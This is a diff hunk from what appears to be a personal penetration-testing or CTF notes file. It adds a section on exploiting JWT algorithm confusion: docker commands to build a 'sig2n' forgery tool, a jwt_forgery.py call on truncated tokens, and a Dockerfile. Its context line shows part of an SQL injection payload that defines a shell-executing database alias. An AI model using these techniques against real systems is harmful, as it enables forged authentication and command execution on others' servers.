@@ -4419,6 +4419,35 @@ SQL Injection';CREATE ALIAS exec_cmd1 AS 'String shellme(String cmd) throws java
 
 ------------------------
 
+### Exploiting JWT Algorithm Confusion
+
+------------------------
+
+- Building cookies with `rsa_sign` docker tool
+
+```
+docker build . -t sig2n
+docker run -it sig2n /bin/bash
+python3 jwt_forgery.py ey.... ey....
+```
+
+- Dockerfile edit, I added vim for cookie edit-:
+
+```
+FROM ubuntu:20.04
+
+RUN apt update && apt install -y python3.8 python3-pip python3-gmpy2 libgmp-dev vim libmpfr-dev libmpc-dev && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+COPY . .
+
+RUN pip3 install -r requirements.txt
+```
+
+- 
+
+
 
 
 
